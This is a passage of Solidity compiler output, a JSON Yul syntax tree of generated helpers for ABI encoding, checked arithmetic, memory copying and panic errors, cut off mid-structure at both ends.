															"nodeType": "YulAssignment",
															"src": "1372:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1379:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1372:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1230:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1236:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1247:3:1",
														"type": ""
													}
												],
												"src": "1117:271:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1512:198:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1522:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1534:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1545:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1530:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1530:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1522:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1600:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1613:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1624:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1609:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1609:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes4_to_t_bytes4_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1558:41:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1558:69:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1558:69:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1675:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1688:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1699:2:1",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1684:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1684:18:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1637:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1637:66:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1637:66:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bytes4_t_bool__to_t_bytes4_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1476:9:1",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1488:6:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1496:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1507:4:1",
														"type": ""
													}
												],
												"src": "1394:316:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1887:248:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1897:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1909:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1920:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1905:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1905:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1897:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1944:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1955:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1940:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1940:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "1963:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1969:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1959:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1959:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1933:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1933:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1933:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1989:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "2123:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1997:124:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1997:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1989:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_3bfaf844afc88d0f2cd5aada38319ff0c45bf19595754524aaf617ffcfd4e2e4__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1867:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1882:4:1",
														"type": ""
													}
												],
												"src": "1716:419:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2239:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2249:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2261:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2272:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2257:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2257:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2249:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2329:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2342:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2353:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2338:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2338:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2285:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2285:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2285:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2211:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2223:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2234:4:1",
														"type": ""
													}
												],
												"src": "2141:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2427:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2438:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2454:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "2448:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2448:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "2438:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2410:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2420:6:1",
														"type": ""
													}
												],
												"src": "2369:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2586:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2596:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "2611:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "2596:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2558:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2563:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "2574:11:1",
														"type": ""
													}
												],
												"src": "2473:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2722:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2739:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "2744:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2732:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2732:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2732:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2760:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2779:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2784:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2775:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2775:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "2760:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2694:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2699:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "2710:11:1",
														"type": ""
													}
												],
												"src": "2626:169:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2843:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2853:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2876:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2858:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2858:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2853:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2887:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2910:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2892:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2892:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2887:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2934:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "2936:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2936:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2936:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2931:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2924:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2924:9:1"
															},
															"nodeType": "YulIf",
															"src": "2921:35:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2966:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2975:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2978:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "2971:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2971:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "2966:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2832:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2835:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "2841:1:1",
														"type": ""
													}
												],
												"src": "2801:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3037:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3047:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3070:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3052:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3052:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "3047:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3081:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3104:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3086:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3086:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "3081:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3128:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "3130:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3130:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3130:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3122:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3125:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "3119:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3119:8:1"
															},
															"nodeType": "YulIf",
															"src": "3116:34:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3160:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3172:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3175:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "3168:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3168:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "3160:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "3023:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "3026:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "3032:4:1",
														"type": ""
													}
												],
												"src": "2992:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3231:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3241:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "3266:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "3259:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "3259:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3252:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3252:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3241:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3213:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3223:7:1",
														"type": ""
													}
												],
												"src": "3189:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3329:105:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3339:89:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "3354:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3361:66:1",
																		"type": "",
																		"value": "0xffffffff00000000000000000000000000000000000000000000000000000000"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "3350:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3350:78:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3339:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bytes4",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3311:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3321:7:1",
														"type": ""
													}
												],
												"src": "3285:149:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3485:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3495:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "3506:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "3495:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "3467:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "3477:7:1",
														"type": ""
													}
												],
												"src": "3440:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3572:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "3582:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "3591:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "3586:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3651:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "3676:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "3681:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "3672:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3672:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "3695:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "3700:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "3691:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "3691:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "3685:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3685:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "3665:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3665:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3665:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "3612:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "3615:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "3609:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3609:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "3623:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "3625:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "3634:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3637:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "3630:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3630:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "3625:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "3605:3:1",
																"statements": []
															},
															"src": "3601:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3748:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "3798:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "3803:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "3794:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3794:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3812:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "3787:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3787:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3787:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "3729:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "3732:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "3726:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3726:13:1"
															},
															"nodeType": "YulIf",
															"src": "3723:101:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "3554:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "3559:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "3564:6:1",
														"type": ""
													}
												],
												"src": "3523:307:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3864:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3881:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3884:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3874:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3874:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3874:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3978:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3981:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3971:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3971:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3971:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4002:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4005:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "3995:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3995:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3995:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "3836:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4050:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4067:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4070:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4060:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "4060:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "4060:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4164:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4167:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "4157:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "4157:15:1"
															},
															"nodeType": "YulExpressionStatement",
